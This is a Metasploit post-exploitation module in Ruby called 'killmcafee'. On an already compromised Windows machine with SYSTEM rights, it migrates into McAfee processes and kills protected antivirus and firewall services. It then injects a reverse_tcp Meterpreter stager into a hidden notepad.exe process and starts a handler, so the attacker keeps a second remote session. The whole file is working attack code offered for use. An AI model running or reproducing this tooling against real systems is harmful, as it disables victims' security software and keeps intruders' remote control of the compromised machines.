require 'msf/core'
require 'rex'


class Metasploit3 < Msf::Post
	include Msf::Auxiliary::Report


	def initialize(info={})
		super( update_info( info,
			'Name'          => 'killmcafee',
			'Description'   => %q{ This module will migrate into Mcshield.exe on the victim machine and
						will kill protected Mcafee services
						which cannot be killed normally even with SYSTEM access.
						The module sometimes may give undesirable results (like all sessions dying).
						Three processes mcshield.exe,hipsvc.exe and firesvc.exe are
						unable to kill each other so I choose to kill mcshiled.exe
						This module needs system access on the victime machine.},
			'License'       => MSF_LICENSE,
			'Author'        => [ 'Nikhil Mittal (Samratashok)'],
			'Platform'      => [ 'win' ],
			'SessionTypes'  => [ 'meterpreter' ]
			))
	end


	# Run Method for when run command is issued
	def run
			print_status("Running module against #{sysinfo['Computer']}")
			mcafee_processes = %W{
						
						scan32.exe
						shstat.exe
						tbmon.exe
						vstskmgr.exe
						engineserver.exe
						mfevtps.exe
						mfeann.exe
						mcscript.exe
						updaterui.exe
						udaterui.exe
						naprdmgr.exe
						frameworkservice.exe
						cleanup.exe
						cmdagent.exe
						frminst.exe
						mcscript_inuse.exe
						mctray.exe
						#mcshield.exe
	}

			
			hips_processes = %W{
						#firesvc.exe
						firetray.exe
						#hipsvc.exe
						mfevtps.exe
						mcafeefire.exe
	}

			print_status("Searching for Mcshield.exe...")
			client.sys.process.get_processes().each do |x|
				if (x['name'].downcase == "mcshield.exe")
					print_status("Found Mcsheild process #{x['pid']}...Migrating into it")
					client.core.migrate(x['pid'])
					print_status("Migrated into #{x['name']} -  #{x['pid']}")
					client.sys.process.get_processes().each do |y|
						if (mcafee_processes.index(y['name'].downcase))
							print_status("Killing off #{y['name']}...")
							client.sys.process.kill(y['pid'])
						end
					end
				end
			end
			
			print_status("Searching for hipsvc.exe...")
			client.sys.process.get_processes().each do |a|
				if (a['name'].downcase == "hipsvc.exe")
					print_status("Found hipsvc process #{a['pid']}...Migrating into it")
					client.core.migrate(a['pid'])
					print_status("Migrated into #{a['name']} -  #{a['pid']}")
					client.sys.process.get_processes().each do |z|
						if (hips_processes.index(z['name'].downcase))
							print_status("Killing off #{z['name']}...")
							client.sys.process.kill(z['pid'])
						end
					end
				end
			end


#####Migrating into explorer.exe to save current session

			client.sys.process.get_processes().each do |e|
				if (e['name'].downcase=="explorer.exe")
					print_status("Found explorer.exe #{e['pid']}...Migrating into it")	
					client.core.migrate(e['pid'])	
				end
			end
#####Duplicating session

			print_status("Duplicating Session")
			duplicate_session
			select(nil, nil, nil, 5)
			print_status("Current process is #{client.sys.process.open.pid}")
			print_status("Current sessions are #{framework.sessions.keys}")

####Using the duplicated session
			session_active=framework.sessions.keys[1]
			client_one=framework.sessions.get(session_active)
			select(nil, nil, nil, 2)
			print_status("Acive Session is #{session_active}")
			client_one.sys.process.get_processes().each do |b|
				if (b['name'].downcase == "mcshield.exe")
					print_status("Found Mcshield process #{b['pid']}...Migrating into it")
					client_one.core.migrate(b['pid'])
					print_status("Migrated into #{b['name']} -  #{b['pid']}")
					print_status("Killing McShield.exe")
					client_one.sys.process.kill(b['pid'])
				end
			end


			rescue ::Interrupt
			raise $!
			rescue ::Rex::Post::Meterpreter::RequestError => e
			print_error("Meterpreter Exception: #{e.class} #{e}")
			print_error("This script requires the use of a SYSTEM user context")
	end


#######Code for duplication (borrowed from duplicate.rb script by scriptjunkie)
	def duplicate_session
		rhost    = Rex::Socket.source_address("1.2.3.4")
		rport    = 443
		lhost    = "127.0.0.1"
		spawn = false
		autoconn = true
		inject   = true
		target_pid = nil
		target    = "notepad.exe"
		pay = nil

		print_status("Creating a reverse meterpreter stager: LHOST=#{rhost} LPORT=#{rport}")
		payload = "windows/meterpreter/reverse_tcp"
		pay = client.framework.payloads.create(payload)
		pay.datastore['LHOST'] = rhost
		pay.datastore['LPORT'] = rport
		mul = client.framework.exploits.create("multi/handler")
		mul.share_datastore(pay.datastore)
		mul.datastore['WORKSPACE'] = client.workspace
		mul.datastore['PAYLOAD'] = payload
		mul.datastore['EXITFUNC'] = 'process'
		mul.datastore['ExitOnSession'] = true
		print_status("Running payload handler")
		mul.exploit_simple(
		'Payload'  => mul.datastore['PAYLOAD'],
		'RunAsJob' => true
	)

	note = client.sys.process.execute('notepad.exe', nil, {'Hidden' => true })
	target_pid = note.pid
	# Do the duplication
	print_status("Injecting meterpreter into process ID #{target_pid}")
	host_process = client.sys.process.open(target_pid, PROCESS_ALL_ACCESS)
	raw = pay.generate
	mem = host_process.memory.allocate(raw.length + (raw.length % 1024))
	print_status("Allocated memory at address #{"0x%.8x" % mem}, for #{raw.length} byte stager")
	print_status("Writing the stager into memory...")
	host_process.memory.write(mem, raw)
	host_process.thread.create(mem, 0)
	print_status("New server process: #{target_pid}")

	end
end
